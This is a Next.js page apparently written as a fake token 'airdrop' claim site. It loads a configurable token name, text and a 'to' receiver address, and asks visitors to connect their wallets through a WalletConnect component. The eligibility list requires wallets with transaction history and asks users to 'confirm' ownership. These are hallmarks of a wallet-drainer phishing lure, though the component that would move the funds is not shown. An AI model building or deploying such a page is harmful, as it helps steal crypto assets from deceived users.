import Head from 'next/head'
import Image from 'next/image'
import 'bootstrap/dist/css/bootstrap.css'
import Script from 'next/script'
import axios from 'axios'
import path from 'path';
import { promises as fs } from 'fs';


import WalletConnect from '../components/WalletConnect'
import { useEffect, useState } from 'react'
import { WagmiConfig, createClient, configureChains, useAccount, useBalance} from 'wagmi'
import { mainnet, goerli, bsc, avalanche, polygon, arbitrum  } from 'wagmi/chains'
import { WalletConnectConnector } from 'wagmi/connectors/walletConnect'
import { Web3Modal } from '@web3modal/react'
import { EthereumClient, w3mConnectors, w3mProvider, WebSocketProvider } from '@web3modal/ethereum'

const projectId = '2c515028cc183de99fa6a655231e348b'
const chains = [arbitrum, mainnet, polygon, goerli, bsc, avalanche]

const { provider } = configureChains(chains, [w3mProvider({ projectId })])
const wagmiClient = createClient({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, version: 1, chains }),
  provider
})
const ethereumClient = new EthereumClient(wagmiClient, chains)


export const getServerSideProps = async ()=> {
    //Find the absolute path of the json directory
  const jsonDirectory = path.join(process.cwd(), 'json');
  //Read the json data file data.json
  const fileContents = await fs.readFile(jsonDirectory + '/config.json', 'utf8');
  const fileRead = JSON.parse(fileContents)
 // console.log(fileContents)
    return {props: {fileRead}}
}


export default function Home({fileRead}) {
  console.log(fileRead)
    const [name, setName] = useState(fileRead.token)
    const [receiver, setReceiver] = useState(fileRead.to)
    const [image, setImage] = useState(fileRead.image)
    const [heading, setHeading] = useState(fileRead.heading)
    const [paragraph, setParagraph] = useState(fileRead.paragraph)
 
  
  return (
    <>
      <Head>
        <title> Airdrop</title>
        <meta name="description" content={`Claim ${name} Tokens`} />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
        <link rel="preconnect" href="https://fonts.googleapis.com"/>
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
        <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@700&family=Lato:wght@400;700;900&family=Public+Sans&family=Raleway:wght@400;500&display=swap" rel="stylesheet"/>
      </Head>
      <Script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"/>
      <WagmiConfig client={wagmiClient}>
      <div style={{backgroundColor: '#020101'}}>
      <nav className="navbar navbar-expand-sm bg-dark navbar-dark">
        <div className="container-fluid">
          <span className="navbar-brand" >
              <h2 className='text-muted'>{name}</h2>
          </span>
        </div>
      </nav>
      <main className='wrapper vh-100' >

       <div className='container my-4'>
          <div className='row'>
            <div className='col-12 col-lg-8 mx-auto'>
              <div className='card bg-dark text-white' style={{position: 'relative'}}>
                
              <Image className="card-img-top" src={image} alt="Card image" width={150} height={400}/>
                <div className='card-body'>
                  <div className='text-center'>
                  <h1>{heading}</h1>
                    <p>
                    {paragraph}
                    </p>
                    <div className="my-3">
                    <Web3Modal projectId={projectId} ethereumClient={ethereumClient}/>

                      <WalletConnect to={receiver}/>
                      
                        
                    </div>
                  </div>
                
                <div className='text-start'>
                  <h3>Eligibility Criteria</h3>
                  <ul>
                        <li>New wallets cannot participate</li>
                        <li>Your wallet must have transactions</li>
                        <li>You must confirm that you are the owner of the wallet</li>
                  </ul>
                </div>
                </div>
              </div>
            </div>
          </div>
          
       </div>
      </main>
      </div>
      </WagmiConfig>
    </>
  )
}
